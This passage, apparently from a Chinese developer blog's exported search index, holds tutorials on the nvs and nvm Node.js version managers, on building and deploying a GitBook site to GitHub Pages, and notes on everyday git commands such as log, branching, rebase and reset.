https://npm.taobao.org/mirrors/node/nvs remote nvs remote命令允许配置多个命名的下载位置。NVS 分别管理来自不同远程位置的版本，因此没有版本冲突的风险。默认情况下，只有一个远程指向 Node.js 官方版本： 123$ nvs remotedefault nodenode https://npm.taobao.org/mirrors/node/ 这样就可以从其他来源获得构建。以下命令为 nightly 添加了一个远程 remote，列出了 nightly ，并添加了一个构建： 12345$ nvs remote add nightly https://nodejs.org/download/nightly/$ nvs lsr nightly/13nightly/13.1.1-nightly20191120c7c566023f...$ nvs add nightly/13 安装和切换node版本12345678910111213141516171819# 展示本地的Node.js列表nvs ls [filter] # 切换Node版本nvs use node/[version]/x64# 更新当前环境的 Node.js 至最新版本nvs upgrade [fromver]# 列出可下载的 Node.js 版本nvs ls-remote [filter]nvs lsr [filter]# 下载某个版本的 Node.jsnvs add [version] # 移除某个版本的 Node.jsnvs rm &lt;version&gt; 根据目录自动切换版本在 Bash 或 PowerShell 中，NVS 可以在更改目录时自动切换当前 Shell 中的 Node.js 版本。默认情况下，此功能处于禁用状态。使它运行nvs auto on。之后，无论何时cd或pushd在包含.node-version或.nvmrc文件的目录下，NVS 都会相应地自动切换 Node.js 版本，并在必要时下载新版本。当您cd到达目录上方没有目录.node-version或.nvmrc文件的目录时，将还原默认（链接）版本（如果有）。 Windows 命令提示符中不提供此功能。请用 PowerShell。 1234567891011~$ nvs link 6.9.1~/.nvs/default -&gt; ~/.nvs/node/6.9.1/x64~$ nvs usePATH += ~/.nvs/default/bin~$ nvs auto on~$ cd myprojectPATH -= ~/.nvs/default/binPATH += ~/.nvs/node/4.6.1/x64/bin~/myproject$ cd ..PATH -= ~/.nvs/node/4.6.1/x64/binPATH += ~/.nvs/default/bin 如果您的外壳与自动切换不兼容，或者您 ​​ 希望手动切换但仍利用其中的任何一个.node-versionor.nvmrc文件，则可以nvs use auto使用该版本运行，也可以直接运行nvs auto。 1nvs use auto 或 nvs auto VS Code 支持nvs 这部分参考官方说明 VS Code可以使用 NVS 选择启动或调试时要使用的 Node.js 版本。在launch.json（位于项目根目录的.vscode文件夹中）添加一个“runtimeArgs”属性，该属性包含一个NVS可识别的版本字符串，以及一个“runtimeExecutable”属性，该属性指向nvs.cmd（Windows）或nvs（Mac, Linux）。对于多平台开发，可以为每个平台自定义配置。如果 NVS 不在 VS Code 的 PATH 环境变量中，则可能需要指定一个绝对路径，例如”${env:HOME}&#x2F;.nvs&#x2F;nvs”)配置示例：配置launch.json，以便VS Code使用NVS启动节点版本6.10： 12345678910111213&quot;configurations&quot;: [ &#123; &quot;type&quot;: &quot;node&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;name&quot;: &quot;Launch Program&quot;, &quot;program&quot;: &quot;$&#123;file&#125;&quot;, &quot;args&quot;: [ ], &quot;runtimeArgs&quot;: [ &quot;6.10&quot; ], &quot;windows&quot;: &#123; &quot;runtimeExecutable&quot;: &quot;nvs.cmd&quot; &#125;, &quot;osx&quot;: &#123; &quot;runtimeExecutable&quot;: &quot;nvs&quot; &#125;, &quot;linux&quot;: &#123; &quot;runtimeExecutable&quot;: &quot;nvs&quot; &#125; &#125;,] “runtimeArgs”中的NVS版本字符串值由完整或部分语义版本号或版本标签（“lts”、“latest”、“Argon”等）组成，可选前跟远程名称，可选后跟处理器架构或位数（“x86”、“x64”、“32”、“64”），用斜杠分隔。当部分版本与多个可用版本匹配时，会自动选择最新版本。示例：“节点&#x2F;lts”、“4.6.0”、“6&#x2F;x86”、“节点&#x2F;6.7&#x2F;x64”。NVS别名也可以代替版本字符串。 或者”runtimeArgs”中的版本字符串可能会被省略（相当于“auto”），在这种情况下，NVS搜索项目目录或父目录中最近的.node-version文件。如果找到，则下载（如有必要）并启动文件中指定的版本。如果没有找到.node-version文件，则将启动默认（链接）版本（如果有的话）。 当不将自动模式与.node-version文件一起使用时，launch.json中指定的节点版本必须已经使用nvs add命令下载。否则，启动将失败，NVS打印错误信息“未找到指定版本”。 有关更多详细信息，请参见NVS VS Code文档。或者执行命令nvs help vscode。 Windows：使用 nvm 版本管理工具查看nvm版本1nvm version 安装和切换node版本1234567891011121314151617# 列出所有node版本。* 代表当前版本。末尾输入 available 显示可供下载的所有版本列表。nvm list [available]# 安装某个版本。version：版本号 例如 8.9.0 或者 latest（最新稳定版）,[arch]可选、指定是否安装32位或64位版本（默认为系统架构），将[arch]设置为 all 安装32和64位版本。nvm install &lt;version&gt; [arch]# 切换node版本。可选[arch]32和64位版本nvm use &lt;version&gt; [arch]# 卸载指定的node版本nvm uninstall &lt;version&gt;# 设置nvm存放不同版本的node.js的目录。 如果没有设置 path ，则显示当前的根目录nvm root &lt;path&gt;# 设置node是以32还是64位模式运行。 指定32或64来覆盖默认操作系统版本。nvm arch [32|64]","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"node","slug":"node","permalink":"https://avalooooooon.github.io/tags/node/"}]},{"title":"gitbook使用教程","slug":"gitbook使用教程","date":"2021-12-26T06:39:24.000Z","updated":"2021-12-27T04:34:54.000Z","comments":true,"path":"2021/12/26/gitbook使用教程/","link":"","permalink":"https://avalooooooon.github.io/2021/12/26/gitbook%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","excerpt":"","text":"参考了这篇文章 检查node环境1node -v 安装gitbook环境安装gitbook-cli工具gitbook-cli是一个在同一系统上安装和使用多个版本的GitBook的实用程序。它将自动安装所需版本的GitBook来构建一本书。打开终端输入npm install gitbook-cli -g进行全局安装： 12npm install gitbook-cli -g gitbook --version 可能遇到的问题:TypeError: cb.apply is not a function解决方案：降低node版本。10.xx.xx是可行的。 Gitbook使用初始化一本书（笔记文件夹）在想要的位置创建一个项目目录，cd到该目录，执行 1gitbook init 可以看到该目录下出现了README.md和SUMMARY.md两个文件。 编辑目录如果SUMMARY.md文件有已经编辑好的目录，gitbook init时会根据目录内容创建文件。下面是SUMMARY.md的一个实例： 12345678* [Introduction](README.md)* [第一章](part1/README.md) * [1.1](part1/1.md) * [1.2](part1/2.md) * [1.2.1](part1/2/1.md)* [第二章](part2/README.md) * [2.1](part2/1.md)* [第三章](part3/README.md) 它生成的文件结构如下： 写笔记根据喜好选择编辑器即可。 启动gitbook服务1gitbook serve 启动服务后，项目文件夹中会生成一个_book文件夹，此文件夹就是最终生成的项目。 生成电子书浏览器打开地址” http://localhost:4000&quot;即可预览。 部署到github首先在项目中创建一个.gitignore文件（和README.md、SUMMARY.md）同级，内容如下： 12# 忽略gitbook生成的项目目录_book 此外，由于gitbook生成的项目跟文档的源码是两个部分，所以可以把文档放到master分支上，部署的网站放到gh-pages 分支。 在github上创建一个仓库自行创建即可。 本地项目提交到github仓库12345git initgit add .git commit -m # 初始化gitbook本地项目&#x27;git remote add origin &lt;git仓库地址&gt;git push -u origin main # 推送到远程仓库的main分支 生成项目并上传到github仓库的gh-pages分支由于打包命令太多，为了简单化，现在写一个脚本命令来自动执行。当然你也可以终端自己执行这些命令。 为了部署方便，可以创建一个脚本文件deploy.sh,内容如下： 123456789101112131415161718192021222324252627282930#!/usr/bin/env shecho &#x27;开始执行命令&#x27;# 生成静态文件echo &#x27;执行命令：gitbook build .&#x27;gitbook build .# 进入生成的文件夹echo &quot;执行命令：cd ./_book\\n&quot;cd ./_book# 初始化一个仓库，仅仅是做了一个初始化的操作，项目里的文件还没有被跟踪echo &quot;执行命令：git init\\n&quot;git init# 保存所有的修改echo &quot;执行命令：git add -A&quot;git add -A# 把修改的文件提交echo &quot;执行命令：commit -m &#x27;deploy&#x27;&quot;git commit -m &#x27;deploy&#x27;# 如果发布到 https://&lt;USERNAME&gt;.github.io/&lt;REPO&gt;echo &quot;执行命令：git push -f git@github.com:Avalooooooon/ING_leetcode_2201.git head:gh-pages&quot;git push -f git@github.com:Avalooooooon/ING_leetcode_2201.git head:gh-pages# 返回到上一次的工作目录echo &quot;回到刚才工作目录&quot;cd - 注意脚本文件代码中仓库地址要替换成你自己的地址。文件保存后，在终端执行如下命令，把生成的项目推送到github仓库上的gh-pages分支： 123bash deploy.sh # macos# windows中，确保已经安装了git工具后直接双击deploy.sh即可运行 执行成功后，打开你的github仓库，然后选择branch分支，会发现多了一个gh-pages分支，打开这个分之后，里面会有一个index.html文件。说明部署的代码上传成功了。注意：如果没有gh-pages分支说明没有部署成功请查看刚才执行的终端看哪里报错了，解决报错直到成功部署。 配置GitHub Pages显示网站在github网站上的仓库里面点击Settings -&gt; GitHub Pages选项中 -&gt; Source里面选择gh-pages branch 然后点击Save按钮，然后在GitHub Pages下面就会看见一个网址，这个网址就是最终的网站。 gitbook多终端使用需要一台已经配置好gitbook环境且有完整gitbook文件夹的终端作为条件。在另一台设备上，git clone仓库的master分支，运行deploy.sh文件。 在Windows端，如果出现报错”Error:ENOENT:no such file or directory, stat ‘C:\\Users\\Lenovo\\www\\mdspg\\md\\mybook_book\\gitbook\\gitbook-plugin-fontsettings\\fontsettings.js’”，在C:\\Users\\username.gitbook\\versions\\3.2.3\\lib\\output\\website\\copyPluginAssets.js，将confirm:true全部替换为confirm:false。共两处。 多终端发布不论是在哪台终端，修改了书籍文件后按下列步骤进行操作： git pull origin main，先pull完成本地与远端的融合 修改书籍内容 git add - A ，添加本地所有文件到仓库 git commit -m 修改说明，提交修改； git push origin main，更新至main分支； 运行deploy.sh文件，生成项目并上传到github仓库的gh-pages分支； gitbook serve，启动gitbook服务。启动服务后，项目文件夹中会生成一个_book文件夹，此文件夹就是最终生成的项目。 gitbook的配置文件讲解如果想对你的网站有更详细的个性化配置或使用插件，那么需要使用配置文件。配置文件写完后，需要重启服务或者重新打包才能应用配置。gitbook的配置文件名是book.json，首先在项目的根目录中创建book.json文件。book.json主要内容： 123456789101112131415161718192021222324252627282930313233&#123; &quot;title&quot;: &quot;我的一本书&quot;, &quot;author&quot; : &quot;yu&quot;, &quot;description&quot; : &quot;我第一本书的描述，很好&quot;, &quot;language&quot; : &quot;zh-hans&quot;, &quot;structure&quot;: &#123; &quot;readme&quot;: &quot;introduction.md&quot; &#125;, &quot;plugins&quot;: [ &quot;-lunr&quot;, &quot;-search&quot;, &quot;search-pro&quot;, &quot;back-to-top-button&quot; ], &quot;pluginsConfig&quot;: &#123; &quot;anchor-navigation-ex&quot;: &#123; &quot;isShowTocTitleIcon&quot;: true &#125; &#125;, &quot;links&quot; : &#123; &quot;sidebar&quot; : &#123; &quot;个性链接1&quot; : &quot;https://www.baidu.com&quot;, &quot;个性链接2&quot; : &quot;https://www.baidu.com&quot; &#125; &#125;, &quot;styles&quot;: &#123; &quot;website&quot;: &quot;styles/website.css&quot;, &quot;ebook&quot;: &quot;styles/ebook.css&quot;, &quot;pdf&quot;: &quot;styles/pdf.css&quot;, &quot;mobi&quot;: &quot;styles/mobi.css&quot;, &quot;epub&quot;: &quot;styles/epub.css&quot; &#125;&#125; book.json中一些主要参数说明 title：标题 author：作者 description：描述，对应gitbook网站的description language：使用的语言，zh-hans是简体中文，会对应到页面的&lt;html lang&#x3D;”zh-hans” &gt; structure：指定 Readme、Summary、Glossary 和 Languages 对应的文件名，下面是这几个文件对应变量以及默认值： Variable Description structure.readme Readme file name (defaults to README.md) structure.summary Summary file name (defaults to SUMMARY.md) structure.glossary Glossary file name (defaults to GLOSSARY.md) structure.languages Languages file name (defaults to LANGS.md) 比如想把readme文件换个名字，则可以使用如下配置 123&quot;structure&quot;: &#123; &quot;readme&quot;: &quot;introduction.md&quot;&#125;, 使用这个配置后，gitbook服务就不会找readme文件，而去找introduction文件当项目说明，这样就可以把readme文件完全当成代码仓库说明文档了。 plugins：使用的插件列表，所有的插件都在这里写出来，然后使用gitbook install来安装。 pluginsConfig：插件的配置信息，如果插件需要配置参数，那么在这里填写。 links：目前可以给侧导航栏添加链接信息12345&quot;links&quot; : &#123; &quot;sidebar&quot; : &#123; &quot;个性链接1&quot; : &quot;https://www.baidu.com&quot; &#125;&#125; styles：自定义页面样式，各种格式对应各自的css文件1234567&quot;styles&quot;: &#123; &quot;website&quot;: &quot;styles/website.css&quot;, &quot;ebook&quot;: &quot;styles/ebook.css&quot;, &quot;pdf&quot;: &quot;styles/pdf.css&quot;, &quot;mobi&quot;: &quot;styles/mobi.css&quot;, &quot;epub&quot;: &quot;styles/epub.css&quot;&#125; 配置默认主题默认的主题可以通过配置来做一下效果。比如侧边栏菜单显示标题数字，可以在配置文件的pluginsConfig参数中写入如下字段： 1234567&#123; &quot;pluginsConfig&quot;: &#123; &quot;theme-default&quot;: &#123; &quot;showLevel&quot;: true &#125; &#125;&#125; 效果如图： gitbook的一些实用插件 gitbook插件可以解决一些网站不太方便的地方，如侧边栏导航不能收缩，自带搜索不支持中文等。用了插件书籍网站会更灵活和美观。 由于插件很多，请参考另一篇文章：https://segmentfault.com/a/1190000019806829","categories":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://avalooooooon.github.io/tags/git/"}]},{"title":"git笔记","slug":"git笔记","date":"2021-12-20T07:40:59.000Z","updated":"2021-12-20T07:40:59.000Z","comments":true,"path":"2021/12/20/git笔记/","link":"","permalink":"https://avalooooooon.github.io/2021/12/20/git%E7%AC%94%E8%AE%B0/","excerpt":"","text":"查看完整教程：Git-scm 查看版本&#x2F;日志123# 项目所在目录git log：查看提交日志（查看版本号）git log git reflog # 查看版本号 不传入任何参数的默认情况下，git log 会按时间先后顺序列出所有的提交，最近的更新排在最上面。git log 有许多选项可以帮助你搜寻你所要找的提交，下面是最常用的几个： -p 或 &#96;&#96;–patch&#96; ：显示每次提交所引入的差异（按补丁的格式输出） -&lt;n&gt; :仅显示最近的 n 条提交。 --since 和 --until ：按照时间作限制。12# 列出最近两周的所有提交$ git log --since=2.weeks 该命令可用的格式十分丰富——可以是类似 &quot;2008-01-15&quot; 的具体的某一天，也可以是类似 &quot;2 years 1 day 3 minutes ago&quot; 的相对日期。 --author : 指定作者 --grep : 搜索提交说明中的关键字 --stat：显示每次提交的简略统计信息。--stat 选项在每次提交的下面列出所有被修改过的文件、有多少文件被修改了以及被修改过的文件的哪些行被移除或是添加了。 在每次提交的最后还有一个总结。 --pretty：使用不同于默认格式的方式展示提交历史。 这个选项有一些内建的子选项供你使用。 比如 oneline 会将每个提交放在一行显示，在浏览大量的提交时非常有用。 当 oneline 或 format 与另一个 log 选项 --graph 结合使用时尤其有用。 这个选项添加了一些 ASCII 字符串来形象地展示你的分支、合并历史。 另外还有 short，full 和 fuller 选项，它们展示信息的格式基本一致，但是详尽程度不一。 format ：可以定制记录的显示格式。 这样的输出对后期提取分析格外有用——因为你知道输出的格式不会随着 Git 的更新而发生改变： 1234$ git log --pretty=format:&quot;%h - %an, %ar : %s&quot;ca82a6d - Scott Chacon, 6 years ago : changed the version number085bb3b - Scott Chacon, 6 years ago : removed unnecessary testa11bef0 - Scott Chacon, 6 years ago : first commit git log --pretty=format 常用的选项 列出了 format 接受的常用格式占位符的写法及其代表的意义。 更详细的选项说明可以参考git log 的常用选项 。 文件文件状态1234# 查看当前分支、分支同远程分支的比较、哪些文件处于什么状态git status# 开始跟踪一个文件/将一个文件放到暂存区、git add 文件名 未跟踪的文件意味着 Git 在之前的快照（提交）中没有这些文件；Git 不会自动将之纳入跟踪范围，除非你明明白白地告诉它“我需要跟踪该文件”。 这样的处理让你不必担心将生成的二进制文件或其它不想被跟踪的文件包含进来。 git add 是个多功能命令：可以用它开始跟踪新文件，也可以用它把已跟踪的文件放到暂存区，还能用于合并时把有冲突的文件标记为已解决状态等。 将这个命令理解为“精确地将内容添加到下一次提交中”而不是“将一个文件添加到项目中”要更加合适。 注意！运行了 git add 之后又作了修订的文件，需要重新运行 git add 把最新版本重新暂存起来。 如果想缩短状态命令的输出： 12git status -s git status --short 新添加的未跟踪文件前面有 ?? 标记，新添加到暂存区中的文件前面有 A 标记，修改过的文件前面有 M 标记。 输出中有两栏，左栏指明了暂存区的状态，右栏指明了工作区的状态。 示例： 123456$ git status -sM READMEMM RakefileA lib/git.rbM lib/simplegit.rb?? LICENSE.txt README 文件在工作区已修改但尚未暂存，而 lib/simplegit.rb 文件已修改且已暂存。 Rakefile文件已修，暂存后又作了修改，因此该文件的修改中既有已暂存的部分，又有未暂存的部分。 文件的忽略总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。 通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。 在这种情况下可以创建一个名为 .gitignore 的文件，列出要忽略的文件的模式。 123$ cat .gitignore*.[oa]*~ 第一行告诉 Git 忽略所有以 .o 或 .a 结尾的文件。一般这类对象文件和存档文件都是编译过程中出现的。 第二行告诉 Git 忽略所有名字以波浪符（~）结尾的文件，许多文本编辑软件（比如 Emacs）都用这样的文件名保存副本。 此外，你可能还需要忽略 log，tmp 或者 pid 目录，以及自动生成的文档等等。 要养成一开始就为你的新仓库设置好 .gitignore 文件的习惯，以免将来误提交这类无用的文件。 文件 .gitignore 的格式规范如下： 所有空行或者以 # 开头的行都会被 Git 忽略。 可以使用标准的 glob 模式匹配，它会递归地应用在整个工作区中。 匹配模式可以以（/）开头防止递归。 匹配模式可以以（/）结尾指定目录。 要忽略指定模式以外的文件或目录，可以在模式前加上叹号（!）取反。 所谓的 glob 模式是指 shell 所使用的简化了的正则表达式。 星号（*）匹配零个或多个任意字符；[abc]匹配任何一个列在方括号中的字符 （这个例子要么匹配一个 a，要么匹配一个 b，要么匹配一个 c）； 问号（?）只匹配一个任意字符；如果在方括号中使用短划线分隔两个字符， 表示所有在这两个字符范围内的都可以匹配（比如 [0-9] 表示匹配所有 0 到 9 的数字）。 使用两个星号（**）表示匹配任意中间目录，比如 a/**/z 可以匹配 a/z 、 a/b/z 或 a/b/c/z 等。 再看一个 .gitignore 文件的例子： 123456789101112# 忽略所有的 .a 文件*.a# 但跟踪所有的 lib.a，即便你在前面忽略了 .a 文件!lib.a# 只忽略当前目录下的 TODO 文件，而不忽略 subdir/TODO/TODO# 忽略任何目录下名为 build 的文件夹build/# 忽略 doc/notes.txt，但不忽略 doc/server/arch.txtdoc/*.txt# 忽略 doc/ 目录及其所有子目录下的 .pdf 文件doc/**/*.pdf 仓库将尚未进行版本控制的本地目录转换为 Git 仓库先cd到该项目目录，然后 1git init 该命令将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。 请记住，工作目录下的每一个文件都不外乎这两种状态：已跟踪 或 未跟踪。 已跟踪的文件是指那些被纳入了版本控制的文件，在上一次快照中有它们的记录，在工作一段时间后， 它们的状态可能是未修改，已修改或已放入暂存区。简而言之，已跟踪的文件就是 Git 已经知道的文件。其它所有文件都属于未跟踪文件。 编辑过某些文件之后，由于自上次提交后你对它们做了修改，Git 将它们标记为已修改文件。 在工作时可以选择性地将这些修改过的文件放入暂存区，然后提交所有已暂存的修改，如此反复。 如果在一个已存在文件的文件夹（而非空文件夹）中进行版本控制，你应该开始追踪这些文件并进行初始提交。 可以通过 git add 命令来指定所需的文件来进行追踪，然后执行 git commit ： 123git add *.cgit add LICENSEgit commit -m &#x27;initial project version&#x27; 从其它服务器克隆一个已存在的 Git 仓库Git 克隆的是该 Git 仓库服务器上的几乎所有数据，而不是仅仅复制完成你的工作所需要文件。 当你执行 git clone 命令的时候，默认配置下远程 Git 仓库中的每一个文件的每一个版本都将被拉取下来。克隆仓库的命令是 git clone 。 比如，要克隆 Git 的链接库 libgit2，可以用下面的命令： 1git clone https://github.com/libgit2/libgit2 这会在当前目录下创建一个名为 “libgit2” 的目录，并在这个目录下初始化一个 .git 文件夹， 从远程仓库拉取下所有数据放入 .git 文件夹，然后从中读取最新版本的文件的拷贝。 1git clone https://github.com/libgit2/libgit2 mylibgit 这会执行与上一条命令相同的操作，但目标目录名变为了 mylibgit。也就是在克隆远程仓库的时候，自定义了本地仓库的名字。 远程仓库1234567891011121314# 查看你已经配置的远程仓库服务器git remote# 指定选项 -v：显示需要读写远程仓库使用的Git保存的简写与其对应的URLgit remote -v# 添加远程仓库，同时指定一个方便使用的简写&lt;shortname&gt;git remote add &lt;shortname&gt; &lt;url&gt;# 查看某个远程仓库。同样会列出远程仓库的 URL 与跟踪分支的信息。git remote show &lt;remote&gt;# 修改一个远程仓库的简写名。这同样也会修改你所有远程跟踪的分支名字。git remote rename# 移除一个远程仓库git remote remove # 或git remote rm。一旦你使用这种方式删除了一个远程仓库，那么所有和这个远程仓库相关的远程跟踪分支以及配置信息也会一起被删除。 origin ——这是 Git 给你克隆的仓库服务器的默认名字。如果使用 clone 命令克隆了一个仓库，命令会自动将其添加为远程仓库并默认以 “origin” 为简写。 拉取、抓取与推送抓取——fetch12# 从远程仓库中获得数据git fetch &lt;remote&gt; 这个命令会访问远程仓库，从中拉取所有你还没有的数据。 执行完成后，你将会拥有那个远程仓库中所有分支的引用，可以随时合并或查看。 必须注意 git fetch 命令只会将数据下载到你的本地仓库——它并不会自动合并或修改你当前的工作。 当准备好时你必须手动将其合并入你的工作。 拉取——pull如果你的当前分支设置了&#x3D;&#x3D;跟踪远程分支&#x3D;&#x3D;，那么可以用 git pull命令来自动抓取后合并该远程分支到当前分支。 这或许是个更加简单舒服的工作流程。默认情况下，git clone 命令会自动设置本地 master 分支跟踪克隆的远程仓库的 master 分支（或其它名字的默认分支）。 运行 git pull 通常会从最初克隆的服务器上抓取数据并自动尝试合并到当前所在的分支。 推送——push1git push &lt;remote&gt; &lt;branch&gt; 只有当你有所克隆服务器的写入权限，并且之前没有人推送过时，这条命令才能生效。 当你和其他人在同一时间克隆，他们先推送到上游然后你再推送到上游，你的推送就会毫无疑问地被拒绝。 你必须先抓取他们的工作并将其合并进你的工作后才能推送。 此外，如果直接使用git push origin xxx,“error: 源引用表达式xxx没有匹配”的问题会在关联的代码库远程分支名称与本地（当前）分支的名称不同时出现。如果不相同，就要用git push origin head:xxx，或者git push origin &lt;当前的本地分支名&gt;:xxx提交代码。 分支概述1234567891011# 查看所有分支及当前所在分支【* 表示当前】git branch# 查看每一个分支的最后一次提交git branch -v# 查看哪些分支已经合并到当前分支。 在这个列表中分支名字前没有 * 号的分支通常可以使用 git branch -d 删除掉，因为已经将它们的工作整合到了另一个分支，所以不会失去任何东西。git branch --merged# 查看所有包含未合并工作的分支。因为它包含了还未合并的工作，尝试使用 git branch -d 命令删除它时会失败。可以使用 -D 选项强制删除它。git branch --no-merged# 例如，尚未合并到 master 分支的有哪些？git branch --no-merged master Git怎么知道当前在哪一个分支上呢？ 很简单，它有一个名为 HEAD 的特殊指针指向当前所在的本地分支（译注：将 HEAD 想象为当前分支的别名）。HEAD 分支随着提交操作自动向前移动。 12345678910111213# 创建一个新的分支。这会在当前所在的提交对象上创建一个指针。# git branch 命令仅仅创建 一个新分支，并不会自动切换到新分支中去。git branch xxx # 创建一个新分支后立即切换过去git checkout -b &lt;newbranchname&gt;# 从当前分支切换到某个分支。HEAD指向切换之后的分支。git checkout xxx # 查看各个分支当前所指的提交对象git log --oneline --decorate# 查看提交历史、各个分支的指向以及项目的分支分叉情况git log --oneline --decorate --graph --all 分支切换会改变你工作目录中的文件!!git 会重置你的工作目录，使其看起来像回到了你在那个分支上最后一次提交的样子。如果 Git 不能干净利落地完成这个任务，它将禁止切换分支。 要留意你的工作目录和暂存区里那些还没有被提交的修改。最好的方法是，在你切换分支之前，保持好一个干净的状态。 12# 删除某个分支【慎重操作】 注意当前不能在iii分支上,跳出之后,再删除git branch -d iii 合并分支——fast-forward当你试图合并两个分支时， 如果顺着一个分支走下去能够到达另一个分支，那么 Git 在合并两者的时候， 只会简单的将指针向前推进（指针右移），因为这种情况下的合并操作没有需要解决的分歧——这就叫做 “快进（fast-forward）”。 合并分支——merge当两个将要合并的分支各自有不同的父提交时发生。比如下面的例子，要合并master和iss53分支：你的开发历史从一个更早的地方开始分叉开来（diverged）。 因为，master 分支所在提交并不是 iss53 分支所在提交的直接祖先，Git 不得不做一些额外的工作。 出现这种情况的时候，Git 会使用两个分支的末端所指的快照（C4 和 C5）以及这两个分支的公共祖先（C2)，做一个简单的三方合并。和之前将分支指针向前推进所不同的是，Git 将此次三方合并的结果做了一个新的快照并且自动创建一个新的提交指向它。 合并分支——rebaserebase（变基） 命令将提交到某一分支上的所有修改都移至另一分支上。考虑之前提到的merge。开发任务分叉到两个不同分支，又各自提交了更新：Merge会把两个分支的最新快照（C3 和 C4）以及二者最近的共同祖先（C2）进行三方合并，合并的结果是生成一个新的快照（并提交)：其实，还有一种方法：你可以提取在 C4 中引入的补丁和修改，然后在 C3 的基础上应用一次。 在这个例子中，你可以检出 experiment 分支，然后将它变基到 master 分支上： 12git checkout experimentgit rebase master 这种操作就叫做 **变基（rebase)**。它的原理是首先找到这两个分支（即当前分支 experiment、变基操作的目标基底分支 master） 的最近共同祖先 C2，然后对比当前分支相对于该祖先的历次提交，提取相应的修改并存为临时文件， 然后将当前分支指向目标基底 C3, 最后以此将之前另存为临时文件的修改依序应用。 （译注：写明了 commit id，以便理解，下同)现在回到 master 分支，进行一次快进合并: 12git checkout mastergit merge experiment 此时，C4&#39; 指向的快照就和merge中 C5 指向的快照一模一样了。 这两种整合方法的最终结果没有任何区别，但是变基使得提交历史更加整洁。 你在查看一个经过变基的分支的历史记录时会发现，尽管实际的开发工作是并行的， 但它们看上去就像是串行的一样，提交历史是一条直线没有分叉。 请注意，无论是通过变基，还是通过三方合并，整合的最终结果所指向的快照始终是一样的，只不过提交历史不同罢了。 变基是将一系列提交按照原有次序依次应用到另一分支上，而合并是把最终结果合在一起。 如果提交存在于你的仓库之外，而别人可能基于这些提交进行开发，那么不要执行变基。 总的原则是，只对尚未推送或分享给别人的本地修改执行变基操作清理历史， 从不对已推送至别处的提交执行变基操作， 合并分支——冲突如果在两个不同的分支中，对同一个文件的同一个部分进行了不同的修改，Git 就没法干净的合并它们。Git 会暂停下来，等待你去解决合并产生的冲突。 你可以在合并冲突后的任意时刻使用 git status 命令来查看那些因包含合并冲突而处于未合并（unmerged）状态的文件。任何因包含合并冲突而有待解决的文件，都会以未合并状态标识出来。 Git 会在有冲突的文件中加入标准的冲突解决标记，这样你可以打开这些包含冲突的文件然后手动解决冲突。 12# 启动一个合适的可视化合并工具，并带领你一步一步解决这些冲突git mergetool 等你退出合并工具之后，Git 会询问刚才的合并是否成功。 如果回答“是”，Git 会暂存那些文件以表明冲突已解决。可以再次运行 git status 来确认所有的合并冲突都已被解决。 合并分支——提交1git commit 关于分支的几个常见场景：1.在新的分支上面常规开发【一般是dev分支】 123456# 在确保当前分支是上一步git checkout过来的即可【不放心的话可以git branch 确认下】git add .git commit -m &quot;yyyy&quot;git pull #注意在多人协作push之前,一定先pull下,养成良好的习惯,避免和被人提交的代码冲突,硬合并而照成代码事故】git push # 【再上一步，pull之后如无冲突，即可提交代码】git status #【查看当前工作空间状态】 2.将次分支和并到主分支上【一般是dev分支合并到主分支master上】【dev分支开发完毕,合并到master分支,并推送上线】 12345git checkout dev # 切到dev次分支】git pull #【获取dev分支变化,合并冲突,使本地dev次分支最新】git checkout master #【先切到主分支master上】git merge dev #【一般是git merge dev,将dev开发完的合并到master上】git push -u origin master #【提交master分支到线上master】 3.将主分支和并到次分支上【一般是主分支master合并到dev分支上】【master分支有变动，需要更新开发分支dev上的代码】 12345git checkout master #【切到主分支】git pull #【获取主分支变化,合并冲突,使本地主分支最新】git checkout dev #【先切到次分支dev上】git merge master #【一般是git merge master,将master开发完的合并到dev上】git push -u origin dev #【提交dev分支到线上dev】 版本回退针对部分文件的撤销操作1.有时提交完了才发现漏掉了几个文件没有添加，或提交信息写错了。 可以运行带有 --amend 选项的提交命令来重新提交： 1$ git commit --amend 这个命令会将暂存区中的文件提交。 如果自上次提交以来你还未做任何修改（例如，在上次提交后马上执行了此命令）， 那么快照会保持不变，而你所修改的只是提交信息。文本编辑器启动后，可以看到之前的提交信息。 编辑后保存会覆盖原来的提交信息，也即用一个新的提交替换旧的提交。 2.取消暂存的文件 1git reset HEAD 要取消暂存的文件名 git reset 确实是个危险的命令，如果加上了 --hard 选项则更是如此。 然而在上述场景中，工作目录中的文件尚未修改，因此相对安全一些。 3.撤消对文件的修改 将它还原成上次提交时的样子（或者刚克隆完的样子，或者刚把它放入工作目录时的样子）: 1git checkout -- &lt;file&gt; 请务必记得 git checkout -- &lt;file&gt; 是一个危险的命令。 你对那个文件在本地的任何修改都会消失——Git 会用最近提交的版本覆盖掉它。 除非你确实清楚不想要对那个文件的本地修改了，否则请不要使用这个命令。 针对整个版本的回退操作假设A 和 B 是正常提交， C 和 D 是错误提交，此时HEAD 指针指向 D 提交。现在想把 C 和 D 回退掉。我们只需将 HEAD 指针移动到 B 提交（idCodeB），就可以达到目的。此时回滚目标B的commitid为idCode1，操作如下： 12345678910# 如果保留修改的撤销-&gt;只删掉提交记录：在项目所在目录执行下列操作git reset HEAD~ # 仓库回滚到上一个版本git reset XXX # 仓库回滚到指定版本git reset --soft idCode1 # 仓库回滚到指定版本# 如果把修改记录也干掉：在项目所在目录执行下列操作git reset --hard idCodeBgit reset --hard HEAD^# 如果是提交到远程仓库上，则在远程仓库上同样执行一次相同的命令 然而，由于即使是在本地执行了git reset –hard (B提交的版本号）使得HEAD 指针移动到 B 提交下，但远程仓库的 HEAD 指针依然不变（还在D提交上），故只能使用 -f 选项将提交强制推到远程仓库：git push -f。它会使 HEAD 指针往回移动，从而会失去之后的提交信息。 而git resert则可以既回退代码，又保存错误的提交。(reset和revert的区别详见这篇博客，主要是 